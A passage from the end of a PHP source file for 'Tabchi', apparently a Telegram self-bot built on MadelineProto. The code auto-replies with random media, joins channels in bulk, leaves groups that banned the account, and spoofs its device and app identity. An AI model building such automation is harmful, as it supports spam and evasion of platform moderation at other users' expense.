$Media = $this->messages->getStickerSet(stickerset: ['_' => 'inputStickerSetShortName', 'short_name' => $Mahdi_a_8['Sticker'][array_rand($Mahdi_a_8['Sticker'])]]);
$this->SendMedia($ChatID, $Media['documents'][array_rand($Media['documents'])], $MsgID, null);
}
elseif ($AutoChat['AutoChat']['Voice'] and $Key_Rand == "Voice") {
$SendMessageRecordAudioAction = ['_' => 'sendMessageRecordAudioAction'];
$this->SetTyping($ChatID, $SendMessageRecordAudioAction);
$Media = ['_' => 'inputMediaUploadedDocument', 'file' => "$Dir/Voice/{$Mahdi_a_8['Voice']}.ogg"];
$this->SendMedia($ChatID, $Media, $MsgID, null);
}
elseif ($AutoChat['AutoChat']['Gif'] and $Key_Rand == "Gif") {
$Media = ['_' => 'inputMediaUploadedDocument', 'file' => "$Dir/Gif/{$Mahdi_a_8['Gif']}.gif"];
$this->SendMedia($ChatID, $Media, $MsgID, null);
}
}
//=-=-=//=-=-=//=-=-=//=-=-=//[" End-Handler-Group "]=-=-=//=-=-=//=-=-=//=-=-=//
}
}

//=-=-=//=-=-=//=-=-=//=-=-=//[" Functions "]=-=-=//=-=-=//=-=-=//=-=-=//
protected function Message(object $Message, string $type, string $text, ?ParseMode $parseMode = ParseMode::MARKDOWN): void
{
$Message->$type(message: $text, parseMode: $parseMode);
}

protected function Send($ChatID, string $text): void
{
try {
$this->SendMessage($ChatID, "$text");
} catch (\danog\MadelineProto\RPCErrorException $RPCErrorException) {
}
}

//=-=-=-=-=-=-=-=-=-=-=-=[" SendMedia "]=-=-=-=-=-=-=-=-=-=-=-=
protected function SendMedia($ChatID, array $Media, int $Message_id, ?string $text, ?ParseMode $parseMode = ParseMode::MARKDOWN): void
{
try {
$this->messages->sendMedia(
peer: $ChatID,
reply_to_msg_id: $Message_id,
media: $Media,
message: $text,
parse_mode: $parseMode
);
} catch (\danog\MadelineProto\RPCErrorException $RPCErrorException) {
}
}

//=-=-=-=-=-=-=-=-=-=-=-=[" SetTyping "]=-=-=-=-=-=-=-=-=-=-=-=
protected function SetTyping($ChatID, array $Action): void
{
try {
$this->messages->setTyping(
action: $Action,
peer: $ChatID
);
} catch (\danog\MadelineProto\RPCErrorException $RPCErrorException) {
}
}

//=-=-=-=-=-=-=-=-=-=-=-=[" GetInline "]=-=-=-=-=-=-=-=-=-=-=-=
protected function GetInline($ChatID, string $Bot, ?string $Query = null, ?string $Offset = '0'): array
{
return $this->messages->getInlineBotResults(
bot: $Bot,
peer: $ChatID,
query: $Query,
offset: $Offset
);
}

//=-=-=-=-=-=-=-=-=-=-=-=[" SendInline "]=-=-=-=-=-=-=-=-=-=-=-=
protected function SendInline($ChatID, int $Message_id, int $Query_id, string $Query_res_id, ?bool $Silent = true, ?bool $Background = false, ?bool $Clear_draft = true): void
{
$this->messages->sendInlineBotResult(
silent: $Silent,
background: $Background,
clear_draft: $Clear_draft,
peer: $ChatID,
reply_to_msg_id: $Message_id,
query_id: $Query_id,
id: $Query_res_id
);
}

//=-=-=-=-=-=-=-=-=-=-=-=[" strContains "]=-=-=-=-=-=-=-=-=-=-=-=
protected function strContains(array|string|null $haystack, array $needles): bool
{
foreach ($needles as $needle) {
if (str_contains($haystack ?? '', $needle)) {
return true;
}
}
return false;
}

//=-=-=-=-=-=-=-=-=-=-=-=[" Join-Channel "]=-=-=-=-=-=-=-=-=-=-=-=
protected function joinChannel(array $Channels): void
{
foreach ($Channels as $Channel) {
$this->channels->joinChannel(channel: $Channel);
}
}

//=-=-=-=-=-=-=-=-=-=-=-=[" KillBan "]=-=-=-=-=-=-=-=-=-=-=-=
protected function KillBan(int $i): int
{
foreach ($this->getDialogIds() as $peer) {
if ($this->getInfo($peer)['type'] == 'supergroup') {
try {
$Ban = $this->channels->getParticipant(channel: $peer, participant: 'me')['participant'];
if ($Ban['_'] == 'channelParticipantBanned') {
$this->channels->leaveChannel(channel: $peer);
$i++;
}
} catch (\Throwable $Throwable) {
}
}
}
return $i;
}

//=-=-=//=-=-=//=-=-=//=-=-=//[" End-Class "]=-=-=//=-=-=//=-=-=//=-=-=//

}

//=-=-=//=-=-=//=-=-=//=-=-=//[" Settings "]=-=-=//=-=-=//=-=-=//=-=-=//
$Settings = new Settings;
$Settings->getPeer()
->setFullFetch(FALSE)
->setCacheAllPeersOnStartup(FALSE);
$Settings->getAppInfo()
->setApiId() // ایپی ایدی اکانت
->setApiHash("") // ایپی هش اکانت
->setDeviceModel("Samsung Galaxy S23")
->setSystemVersion("plus messenger")
->setAppVersion("10.2.9.0");
$Settings->getLogger()->setLevel(Logger::LEVEL_ULTRA_VERBOSE);
MyEventHandler::startAndLoop('Tabchi', $Settings);
//=-=-=-=-=-=-=-=-=-=-=-=[" Tabchi-Cli "]=-=-=-=-=-=-=-=-=-=-=-=
/*

 * Basic MadelineProto-v8
 * Robot  : Tabchi
 * Date   : 2022/09/25
 * Author : @Mahdi_a_8
 * Open   : Sourcekade
 * https://t.me/Sourrce_kade
 
 */
//=-=-=-=-=-=-=-=-=-=-=-=[" End "]=-=-=-=-=-=-=-=-=-=-=-=